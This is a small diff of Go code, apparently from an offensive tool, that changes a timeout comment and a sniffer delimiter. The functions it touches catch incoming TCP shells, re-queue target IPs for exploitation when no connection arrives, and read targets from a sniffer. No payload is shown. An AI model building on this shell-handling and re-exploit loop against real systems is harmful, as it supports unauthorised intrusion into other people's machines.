@@ -32,7 +32,7 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
     select{
     case conn = <- connchan:
       i = -1
-    case <- time.After(6000 * time.Millisecond):
+    case <- time.After(6000 * time.Millisecond)://timeout
       fmt.Println("No connection found, attempting to exploit again")
       exploit_request_channel <- ip
     }
@@ -77,8 +77,8 @@ func ListenForSnifferData(ip_passing_channel chan string){
       fmt.Println("We gotta error connecting to the sniffer: " + err.Error())
     }
     ipreader := bufio.NewReader(conn)
-    //ip, readerr := reader.ReadString('\x00')
-    ip, readerr := ipreader.ReadString('\n')
+    ip, readerr := ipreader.ReadString('\x00')
+    //ip, readerr := ipreader.ReadString('\n')
     if readerr != nil {
       fmt.Println("We gotta error reading from the sniffer: " + readerr.Error())
     }
